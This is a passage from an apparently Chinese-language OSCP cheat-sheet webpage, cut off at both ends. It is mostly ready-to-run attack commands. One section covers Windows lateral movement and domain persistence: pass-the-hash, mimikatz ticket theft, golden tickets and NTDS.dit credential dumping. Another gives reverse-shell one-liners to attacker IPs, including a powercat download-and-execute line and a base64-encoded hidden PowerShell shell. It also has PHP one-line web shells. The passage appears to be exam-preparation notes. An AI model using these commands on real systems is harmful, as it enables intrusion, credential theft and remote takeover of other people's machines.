</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">## 目标:使用用户的哈希值或Kerberos票据进行身份验证并获得代码执行权限</span>
</span></span><span class="line"><span class="cl"><span class="c">### Kerberos和NTLM不直接使用明文密码，微软原生工具也不支持使用hash进行身份验证</span>
</span></span><span class="line"><span class="cl"><span class="p">------------------------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="c">## 横向</span>
</span></span><span class="line"><span class="cl"><span class="p">%%</span> <span class="n">貌似横向内容中</span> <span class="n">需要本地管理员权限的</span> <span class="n">好像</span> <span class="n">是administrator组内的成员都可以</span> <span class="p">%%</span>
</span></span><span class="line"><span class="cl">	<span class="p">--------</span> 
</span></span><span class="line"><span class="cl">	<span class="n">1</span><span class="c">### WMI和WinRM  </span>
</span></span><span class="line"><span class="cl">	<span class="n">条件</span><span class="err">:</span><span class="n">有帐号密码</span><span class="p">+</span>
</span></span><span class="line"><span class="cl">		<span class="c">#### WMI 需要账户是目标本地管理员组的成员</span>
</span></span><span class="line"><span class="cl">			<span class="n">ps</span><span class="p">&gt;</span> <span class="p">~/</span><span class="n">桌面</span><span class="p">/</span><span class="n">OSCP</span><span class="p">/</span><span class="n">smallTools</span><span class="p">/</span><span class="n">reverseShell_WMI</span><span class="p">.</span><span class="n">txt</span>
</span></span><span class="line"><span class="cl">		<span class="c">#### winrs只适用于域用户，而且是目标主机上管理员或远程管理用户组的一部分</span>
</span></span><span class="line"><span class="cl">			<span class="n">ps</span><span class="p">&gt;</span> <span class="n">winrs</span> <span class="n">-r</span><span class="err">:</span><span class="n">files04</span> <span class="n">-u</span><span class="err">:</span><span class="n">jen</span> <span class="n">-p</span><span class="err">:</span><span class="n">Nexus123</span><span class="p">!</span>  <span class="s2">&#34;powershell -nop -w hidden -e xxx&#34;</span>
</span></span><span class="line"><span class="cl">			<span class="n">或</span><span class="err">：</span><span class="n">ps</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$username</span> <span class="p">=</span> <span class="s1">&#39;jen&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$password</span> <span class="p">=</span> <span class="s1">&#39;Nexus123!&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$secureString</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="nv">$password</span> <span class="n">-AsPlaintext</span> <span class="n">-Force</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$credential</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$secureString</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="nb">New-PSSession</span> <span class="n">-ComputerName</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">73</span> <span class="n">-Credential</span> <span class="nv">$credential</span>
</span></span><span class="line"><span class="cl">			<span class="nb">Enter-PSSession</span> <span class="n">idNum</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="p">-------</span> 
</span></span><span class="line"><span class="cl">	<span class="n">2</span><span class="c">### PsExec </span>
</span></span><span class="line"><span class="cl">	<span class="n">条件</span><span class="err">:</span><span class="n">已有账户是目标本地管理员组的一部分</span><span class="p">+</span><span class="n">ADMIN</span><span class="nv">$共享必须可用</span><span class="p">+</span><span class="n">文件和打印机共享必须已打开</span><span class="err">。</span><span class="n">最后2默认打开</span>   <span class="c">##默认比wmiexec获取的权限高</span>
</span></span><span class="line"><span class="cl">		<span class="p">./</span><span class="n">PsExec64</span><span class="p">.</span><span class="n">exe</span> <span class="n">-i</span>  <span class="p">\\</span><span class="n">web04</span> <span class="n">-u</span> <span class="n">corp</span><span class="p">\</span><span class="n">jen</span> <span class="n">-p</span> <span class="n">Nexus123</span><span class="p">!</span> <span class="n">cmd</span>
</span></span><span class="line"><span class="cl">		<span class="nb">impacket-psexec</span> <span class="n">-hashes</span> <span class="n">00000000000000000000000000000000</span><span class="err">:</span><span class="n">管理员hash</span> <span class="n">Administrator</span><span class="nv">@120</span><span class="p">.</span><span class="n">63</span><span class="p">.</span><span class="n">142</span><span class="p">.</span><span class="n">48</span> <span class="n">cmd</span><span class="p">.</span><span class="n">exe</span>
</span></span><span class="line"><span class="cl">		<span class="nb">impacket-psexec</span> <span class="s1">&#39;yoshi@172.16.222.82&#39;</span>
</span></span><span class="line"><span class="cl">		<span class="nb">impacket-psexec</span> <span class="s1">&#39;yoshi:Mushroom!@172.16.222.82&#39;</span> 
</span></span><span class="line"><span class="cl">		<span class="nb">impacket-psexec</span> <span class="s1">&#39;relia.com/xxx:pass@192.168.248.189&#39;</span> 
</span></span><span class="line"><span class="cl">		<span class="c">###有了Kerberos票据可以免帐号密码使用 .\PsExec.exe \\files04 cmd</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="p">-------</span> 
</span></span><span class="line"><span class="cl">	<span class="n">3</span><span class="c">### Pass The Hash pth. 只适用于NTLM，适用于Active Directory域帐户和内置的本地管理员帐户</span>
</span></span><span class="line"><span class="cl">	<span class="n">条件</span><span class="err">:</span><span class="n">已有hash是目标本地管理员组的一部分</span><span class="p">+</span><span class="n">开ADMIN</span><span class="p">$+</span><span class="n">开445</span><span class="p">+</span><span class="n">启用Windows文件和打印机共享</span><span class="err">。</span><span class="n">最后2默认打开</span>
</span></span><span class="line"><span class="cl">		<span class="nb">impacket-wmiexec</span> <span class="n">-hashes</span> <span class="err">:</span><span class="n">2892D26CDF84D7A70E2EB3B9F05C425E</span> <span class="n">Administrator</span><span class="nv">@192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">202</span><span class="p">.</span><span class="n">72</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="p">-------</span>
</span></span><span class="line"><span class="cl">	<span class="n">4</span><span class="c">### Overpass The Hash 利用tgt</span>
</span></span><span class="line"><span class="cl">	<span class="n">条件</span><span class="err">:</span><span class="n">有管理员权限能正常运行mimikatz</span><span class="err">，</span><span class="n">有目标账户的hash</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 获取tgt</span>
</span></span><span class="line"><span class="cl">			<span class="n">sekurlsa</span><span class="p">::</span><span class="n">pth</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">corp</span><span class="p">.</span><span class="n">com</span> <span class="p">/</span><span class="n">ntlm</span><span class="err">:</span><span class="n">2892D26CDF84D7A70E2EB3B9F05C425E</span> <span class="p">/</span><span class="n">run</span><span class="err">:</span><span class="n">powershell</span>
</span></span><span class="line"><span class="cl">			 <span class="n">net</span> <span class="n">user</span> <span class="p">/</span><span class="n">domain</span>
</span></span><span class="line"><span class="cl">			 <span class="n">klist</span>
</span></span><span class="line"><span class="cl">			 <span class="p">.\</span><span class="n">PsExec</span><span class="p">.</span><span class="n">exe</span> <span class="p">\\</span><span class="n">web04</span> <span class="n">cmd</span>    <span class="c">##条件见psexec条件</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="p">-------</span> 
</span></span><span class="line"><span class="cl">	<span class="n">5</span><span class="c">### Pass The Ticket 利用tgs，可以导出并重新注入，如果服务票据属于当前用户，则不需要管理员权限。</span>
</span></span><span class="line"><span class="cl">	<span class="n">条件</span><span class="err">:</span><span class="n">内存中有想要的tgs</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 导出票据</span>
</span></span><span class="line"><span class="cl">			<span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
</span></span><span class="line"><span class="cl">			<span class="n">sekurlsa</span><span class="p">::</span><span class="n">tickets</span> <span class="p">/</span><span class="n">export</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 列所有票据 </span>
</span></span><span class="line"><span class="cl">			<span class="nb">dir </span><span class="p">*.</span><span class="n">kirbi</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 导入票据到自己的会话 cifs</span>
</span></span><span class="line"><span class="cl">			<span class="n">kerberos</span><span class="p">::</span><span class="n">ptt</span> <span class="p">[</span><span class="n">0</span><span class="p">;</span><span class="n">12bd0</span><span class="p">]-</span><span class="n">0</span><span class="p">-</span><span class="n">0</span><span class="p">-</span><span class="n">40810000-dave</span><span class="nv">@cifs</span><span class="n">-web04</span><span class="p">.</span><span class="n">kirbi</span>
</span></span><span class="line"><span class="cl">			<span class="n">klist</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="p">-------</span> 
</span></span><span class="line"><span class="cl">	<span class="n">6</span><span class="c">### DCOM </span>
</span></span><span class="line"><span class="cl">	<span class="n">条件</span><span class="err">:</span><span class="n">当前账户需要是目标机器的本地管理员组的成员</span>
</span></span><span class="line"><span class="cl">		<span class="c">####利用 目标ip </span>
</span></span><span class="line"><span class="cl">		<span class="nv">$dcom</span> <span class="p">=</span> <span class="no">[System.Activator]</span><span class="p">::</span><span class="n">CreateInstance</span><span class="p">(</span><span class="no">[type]</span><span class="p">::</span><span class="n">GetTypeFromProgID</span><span class="p">(</span><span class="s2">&#34;MMC20.Application.1&#34;</span><span class="p">,</span><span class="s2">&#34;192.168.50.73&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nv">$dcom</span><span class="p">.</span><span class="n">Document</span><span class="p">.</span><span class="n">ActiveView</span><span class="p">.</span><span class="n">ExecuteShellCommand</span><span class="p">(</span><span class="s2">&#34;powershell&#34;</span><span class="p">,</span><span class="nv">$null</span><span class="p">,</span><span class="s2">&#34;powershell -nop -w hidden -e xxx&#34;</span><span class="p">,</span><span class="s2">&#34;7&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">------------------------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="c">## 持久化 Persistence</span>
</span></span><span class="line"><span class="cl">	<span class="p">-------</span> 
</span></span><span class="line"><span class="cl">	<span class="c">## 黄金票据  获取到krbtgt密码哈希(secret key)，就能自己创建tgt。伪造后可以获取整域的资源，给低权限发放域管tgt</span>
</span></span><span class="line"><span class="cl">	<span class="n">条件</span><span class="err">：</span><span class="n">域管理员组的成员或dc的权限</span>
</span></span><span class="line"><span class="cl">		<span class="n">dc</span><span class="p">&gt;</span><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>   
</span></span><span class="line"><span class="cl">		<span class="n">dc</span><span class="p">&gt;</span><span class="n">lsadump</span><span class="p">::</span><span class="n">lsa</span> <span class="p">/</span><span class="n">patch</span>   <span class="c">##导出krbtgt的NTLM和域SID</span>
</span></span><span class="line"><span class="cl">		<span class="c">###vic上注入票据内存不需要任何admin权限，未加入域的主机也可以</span>
</span></span><span class="line"><span class="cl">		<span class="n">vic</span><span class="p">&gt;</span><span class="n">kerberos</span><span class="p">::</span><span class="n">purge</span> 
</span></span><span class="line"><span class="cl">		<span class="n">vic</span><span class="p">&gt;</span><span class="n">kerberos</span><span class="p">::</span><span class="n">golden</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">jen</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">corp</span><span class="p">.</span><span class="n">com</span> <span class="p">/</span><span class="n">sid</span><span class="err">:</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">1987370270</span><span class="p">-</span><span class="n">658905905</span><span class="p">-</span><span class="n">1781884369</span> <span class="p">/</span><span class="n">krbtgt</span><span class="err">:</span><span class="n">1693c6cefafffc7af11ef34d1c788f47</span> <span class="p">/</span><span class="n">ptt</span>
</span></span><span class="line"><span class="cl">		<span class="n">vic</span><span class="p">&gt;</span><span class="n">misc</span><span class="p">::</span><span class="n">cmd</span>
</span></span><span class="line"><span class="cl">		<span class="n">vic</span><span class="p">&gt;</span><span class="n">PsExec</span><span class="p">.</span><span class="n">exe</span> <span class="p">\\</span><span class="n">dc1</span> <span class="n">cmd</span><span class="p">.</span><span class="n">exe</span>
</span></span><span class="line"><span class="cl">		
</span></span><span class="line"><span class="cl">	<span class="p">--------</span>
</span></span><span class="line"><span class="cl">	<span class="c">## 影子副本 vss vshadow&gt;NTDS.dit&gt;可提取每个用户凭据</span>
</span></span><span class="line"><span class="cl">	<span class="n">条件</span><span class="err">：</span><span class="n">域管权限</span> <span class="n">缺点</span><span class="err">：</span><span class="n">要传vshadow</span><span class="p">.</span><span class="n">exe</span><span class="p">,</span><span class="n">可以直接在dc上mimikatz</span>
</span></span><span class="line"><span class="cl">		<span class="n">win</span><span class="p">&gt;</span> <span class="n">vshadow</span><span class="p">.</span><span class="n">exe</span> <span class="n">-nw</span> <span class="n">-p</span>  <span class="n">C:</span>
</span></span><span class="line"><span class="cl">			<span class="n">Shadow</span> <span class="nb">copy </span><span class="n">device</span> <span class="n">name</span><span class="err">:</span>
</span></span><span class="line"><span class="cl">		<span class="n">win</span><span class="p">&gt;</span> <span class="nb">copy </span><span class="p">\\?\</span><span class="n">GLOBALROOT</span><span class="p">\</span><span class="n">Device</span><span class="p">\</span><span class="n">HarddiskVolumeShadowCopy2</span><span class="p">\</span><span class="n">windows</span><span class="p">\</span><span class="n">ntds</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="n">dit</span> <span class="n">c:</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="n">dit</span><span class="p">.</span><span class="n">bak</span>
</span></span><span class="line"><span class="cl">		<span class="n">win</span><span class="p">&gt;</span> <span class="n">reg</span><span class="p">.</span><span class="n">exe</span> <span class="n">save</span> <span class="n">hklm</span><span class="p">\</span><span class="n">system</span> <span class="n">c:</span><span class="p">\</span><span class="n">system</span><span class="p">.</span><span class="n">bak</span>
</span></span><span class="line"><span class="cl">		<span class="n">kali</span><span class="p">&gt;</span><span class="nb">impacket-secretsdump</span> <span class="n">-ntds</span> <span class="n">ntds</span><span class="p">.</span><span class="n">dit</span><span class="p">.</span><span class="n">bak</span> <span class="n">-system</span> <span class="n">system</span><span class="p">.</span><span class="n">bak</span> <span class="n">LOCAL</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><h2 id="反弹shell"><a href="#反弹shell" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>反弹shell..</h2>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">------------</span>
</span></span><span class="line"><span class="cl"><span class="c">### linux</span>
</span></span><span class="line"><span class="cl"><span class="n">bash</span> <span class="n">-c</span> <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/192.168.45.249/1234 0&gt;&amp;1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;bash&#39;</span><span class="p">,</span><span class="s1">&#39;-c&#39;</span><span class="p">,</span><span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/192.168.45.249/1234 0&gt;&amp;1&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">### cli内容&gt;&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo </span><span class="s2">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.45.249/1234 0&gt;&amp;1&#39; &gt;/tmp/f&#34;</span> <span class="p">&gt;&gt;</span> <span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">this_is_fine</span><span class="p">.</span><span class="n">sh</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">------------</span>
</span></span><span class="line"><span class="cl"><span class="c">### win</span>
</span></span><span class="line"><span class="cl"><span class="n">用这个只改ip</span> <span class="n">port</span><span class="p">&gt;</span>  <span class="p">~/</span><span class="n">桌面</span><span class="p">/</span><span class="n">OSCP</span><span class="p">/</span><span class="n">smallTools</span><span class="p">/</span><span class="n">reverseShell_powershell</span><span class="p">.</span><span class="n">py</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">或powercat</span>
</span></span><span class="line"><span class="cl"><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="s2">&#34;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.45.213:1111/powercat.ps1&#39;); powercat -c 192.168.45.213 -p 1234 -e powershell&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s1">&#39;$client = New-Object System.Net.Sockets.TCPClient(&#34;192.168.45.212&#34;,1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#34;PS &#34; + (pwd).Path + &#34;&gt; &#34;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">### 反弹shell并编码  在线运行：https://www.w3cschool.cn/tryrun/runcode?lang=powershell</span>
</span></span><span class="line"><span class="cl"><span class="nv">$Text</span> <span class="p">=</span> <span class="s1">&#39;$client = New-Object System.Net.Sockets.TCPClient(&#34;192.168.45.248&#34;,1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#34;PS &#34; + (pwd).Path + &#34;&gt; &#34;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$Bytes</span> <span class="p">=</span> <span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$Text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$EncodedText</span> <span class="p">=</span><span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$Bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$EncodedText</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">use</span> <span class="p">&gt;</span> <span class="n">powershell</span> <span class="n">-enc</span> <span class="s2">&#34;xxxx&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">use</span> <span class="p">&gt;</span> <span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-nop</span> <span class="n">-w</span> <span class="n">hidden</span> <span class="n">-enc</span> <span class="s2">&#34;xxx&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">## winbase64编码</span>
</span></span><span class="line"><span class="cl"><span class="p">```</span><span class="n">bash</span>
</span></span><span class="line"><span class="cl"><span class="nv">$Text</span> <span class="p">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$Bytes</span> <span class="p">=</span> <span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$Text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$EncodedText</span> <span class="p">=</span><span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$Bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$EncodedText</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">huozhe</span>
</span></span><span class="line"><span class="cl"><span class="p">~/</span><span class="n">桌面</span><span class="p">/</span><span class="n">OSCP</span><span class="p">/</span><span class="n">smallTools</span><span class="p">/</span><span class="n">reverseShell_powershell</span><span class="p">.</span><span class="n">py</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><h2 id="一句话"><a href="#一句话" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>一句话</h2>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;?php system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span>base64_decode<span class="o">(</span><span class="s1">&#39;Y21k&#39;</span><span class="o">)])</span><span class="p">;</span>?&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;?php system<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">])</span><span class="p">;</span> ?&gt;
</span></span><span class="line"><span class="cl">&lt;?php <span class="nb">echo</span> system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">])</span><span class="p">;</span> ?&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">&lt;?php system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">])</span><span class="p">;</span>?&gt;
</span></span></code></pre></td></tr></table></div>
</div>
</div><h2 id="钓鱼fish"><a href="#钓鱼fish" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 